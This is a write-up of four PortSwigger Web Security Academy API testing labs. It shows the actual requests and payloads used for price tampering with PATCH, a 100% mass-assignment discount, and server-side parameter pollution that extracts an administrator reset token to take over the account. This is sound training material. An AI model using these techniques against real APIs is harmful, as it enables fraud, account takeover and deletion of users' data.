# API Testing - Labs

## Overview

This section contains a summary of the practical labs completed during the PortSwigger Web Security Academy API Testing learning path.

The labs were used to apply the concepts learned during the learning path in realistic web application scenarios.

---

## 1. Exploiting an API Endpoint Using Documentation

### Objective

Delete the user `carlos`.

### What We Did

We first investigated the API documentation and discovered available API endpoints.

The documentation revealed functionality including:

    GET /user/[username]
    DELETE /user/[username]

The `DELETE` endpoint provided functionality that could be directly interacted with through the API.

### Exploitation

Request:

    DELETE /user/carlos

### Result

The request successfully deleted the user.

    User deleted successfully!

### Status

    SOLVED

### Main Concepts

- API documentation
- API endpoint discovery
- Direct API interaction
- `DELETE` HTTP method
- Identifying additional attack surface

---

## 2. Finding and Exploiting an Unused API Endpoint

### Objective

Purchase a product by modifying its price.

### What We Did

We investigated the application's API functionality and discovered an endpoint that was not being used by the normal front-end flow.

Discovered endpoint:

    GET /api/products/1/price

We then used the `OPTIONS` method to determine which HTTP methods were supported.

Request:

    OPTIONS /api/products/1/price

The endpoint supported:

    GET, PATCH

### Testing the PATCH Method

We changed the request to:

    PATCH /api/products/1/price

Initially, the server returned an error because the expected request body was missing.

We added:

    Content-Type: application/json

and sent:

    {}

The server responded:

    'price' parameter missing in body

This revealed the required parameter.

### Exploitation

We then sent:

    {
      "price": 0
    }

The server responded:

    {
      "price": "$0.00"
    }

The product price was successfully changed to `$0.00`.

We were then able to purchase the product and complete the lab.

### Attack Flow

    Discover unused endpoint
            ↓
    Send OPTIONS request
            ↓
    Discover PATCH
            ↓
    Send PATCH request
            ↓
    Analyze server error
            ↓
    Identify price parameter
            ↓
    Set price to 0
            ↓
    Purchase product
            ↓
    Lab solved

### Result

    Product price successfully changed to $0.00.

### Status

    SOLVED

### Main Concepts

- API endpoint discovery
- Unused API endpoints
- `OPTIONS`
- HTTP method testing
- `PATCH`
- JSON request bodies
- Error analysis
- API attack surface

---

## 3. Exploiting a Mass Assignment Vulnerability

### Objective

Purchase a product using a hidden discount parameter.

### What We Did

We logged in using:

    wiener:peter

We then added the product and inspected the checkout API.

By comparing the data sent by the client with the data returned by the API, we identified a hidden parameter:

    chosen_discount

The parameter contained:

    {
      "percentage": 10
    }

### Testing the Hidden Parameter

We first tested a `10%` discount.

Request data:

    {
      "chosen_discount": {
        "percentage": 10
      }
    }

The parameter was accepted, but the discount was not sufficient to complete the purchase.

This indicated that the hidden parameter was being processed by the application.

### Exploitation

We then changed the discount to `100%`.

Request:

    {
      "chosen_discount": {
        "percentage": 100
      }
    }

The server responded:

    HTTP/2 201 Created

The response contained:

    /cart/order-confirmation?order-confirmed=true

The purchase was successfully completed.

### Result

    Order successfully created.

### Status

    SOLVED

### Main Concepts

- Mass assignment
- Automatic parameter binding
- Hidden parameters
- Comparing API requests and responses
- Testing unexpected properties
- Exploiting sensitive object properties

---

## 4. Exploiting Server-Side Parameter Pollution in a Query String

### Objective

Log in as the administrator and delete the user `carlos`.

### What We Did

We started with the password reset functionality for:

    administrator

The application returned information related to the administrator's account.

We investigated how the supplied username was incorporated into the server-side request.

### Step 1 - Testing Parameter Injection

We injected an additional parameter using the URL-encoded `&` character:

    username=administrator%26x=y

The server responded:

    {
      "error": "Parameter is not supported."
    }

This indicated that the injected value was being interpreted as a separate parameter by the internal API.

---

### Step 2 - Testing Query Truncation

We then tested the URL-encoded `#` character:

    username=administrator%23

The server responded:

    {
      "error": "Field not specified."
    }

This indicated that the query string was being truncated and the expected `field` parameter was no longer present.

---

### Step 3 - Confirming the Field Parameter

We then injected:

    username=administrator%26field=x%23

The server responded:

    {
      "type": "ClientError",
      "code": 400,
      "error": "Invalid field."
    }

This showed that:

- The `field` parameter was recognized.
- The supplied value was invalid.
- The injected parameter was reaching the internal API.

---

### Step 4 - Discovering Valid Field Names

We used Burp Intruder with the built-in:

    Server-side variable names

payload list.

The request structure was:

    username=administrator%26field=§x§%23

Testing revealed valid fields including:

    username
    email

We then tested:

    reset_token

---

### Step 5 - Extracting the Reset Token

The successful request was:

    username=administrator%26field=reset_token%23

The server responded:

    {
      "result": "rs22h1d9uttwfwrzlvscqqmzh23bdi54",
      "type": "reset_token"
    }

The reset token was then used with the password reset functionality.

---

### Step 6 - Administrator Access

Using the reset token, we accessed the password reset form and changed the administrator password.

We then logged in as the administrator.

---

### Step 7 - Final Impact

From the Admin panel, we deleted:

    carlos

The application displayed:

    User deleted successfully!

### Attack Flow

    Password reset functionality
            ↓
    Test %26
            ↓
    Confirm parameter injection
            ↓
    Test %23
            ↓
    Confirm query truncation
            ↓
    Identify "field"
            ↓
    Use Burp Intruder
            ↓
    Discover "reset_token"
            ↓
    Extract reset token
            ↓
    Reset administrator password
            ↓
    Login as administrator
            ↓
    Delete "carlos"
            ↓
    Lab solved

### Result

    Administrator access obtained.

    "carlos" successfully deleted.

    User deleted successfully!

### Status

    SOLVED

### Main Concepts

- Server-side parameter pollution
- Query string manipulation
- `%26`
- `%23`
- Internal API interaction
- Burp Repeater
- Burp Intruder
- Server-side variable discovery
- Password reset token extraction
- Authentication impact

---

# Overall Lab Summary

All labs in the API Testing learning path were successfully completed.

| # | Lab | Main Technique | Status |
|---|---|---|---|
| 1 | Exploiting an API Endpoint Using Documentation | API documentation / DELETE | SOLVED |
| 2 | Finding and Exploiting an Unused API Endpoint | OPTIONS / PATCH | SOLVED |
| 3 | Exploiting a Mass Assignment Vulnerability | Mass assignment | SOLVED |
| 4 | Exploiting Server-Side Parameter Pollution in a Query String | Query string pollution | SOLVED |

---

# Overall Practical Methodology

The practical labs demonstrated the following general API testing workflow:

    Reconnaissance
          ↓
    Discover API endpoints
          ↓
    Identify available functionality
          ↓
    Identify supported HTTP methods
          ↓
    Test parameters
          ↓
    Analyze errors and responses
          ↓
    Identify unintended behavior
          ↓
    Exploit the vulnerability
          ↓
    Verify the impact